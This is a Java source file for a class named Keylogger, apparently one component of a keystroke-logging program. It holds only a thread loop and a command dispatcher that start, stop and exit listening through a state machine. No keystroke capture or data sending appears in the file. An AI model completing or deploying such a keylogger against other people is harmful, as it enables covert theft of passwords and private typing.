package tk.arktech;

import java.nio.CharBuffer;
import java.util.ArrayList;
import java.util.concurrent.BlockingQueue;

public class Keylogger implements Runnable {

    private Context context;
    private final BlockingQueue<String> queueout;
    private final BlockingQueue<String> queuein;
    private CharBuffer buf;
    private boolean flag = true;
    private CommandExecutor executor;

    public Keylogger(BlockingQueue<String> queueout, BlockingQueue<String> queuein) {
        ArrayList<Object>  array = new ArrayList<>();
        array.add(queueout);
        buf = CharBuffer.allocate(240);
        array.add(buf);
        context = new Context( array);


        context.setState(new StateIdle(context));
        this.queueout = queueout;
        this.queuein = queuein;

        executor = new CommandExecutor(this::startListening, "start");
        executor.add(new CommandExecutor(this::stopListening, "stop"))
                .add(new CommandExecutor(this::stopKeylogger, "exit"));
    }

    public void startListening()
    {
        if(!(context.getState() instanceof StateListen))
        {
            context.doAction();
        }
    }

    public void stopListening()
    {
        if(context.getState() instanceof StateListen)
        {
            context.doAction();
        }
    }

    public void stopKeylogger()
    {
        stopListening();
        flag = false;
    }


    @Override
    public void run() {

        while(flag)
        {
            try {
                executor.handle(queuein.take());
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }




    }
}
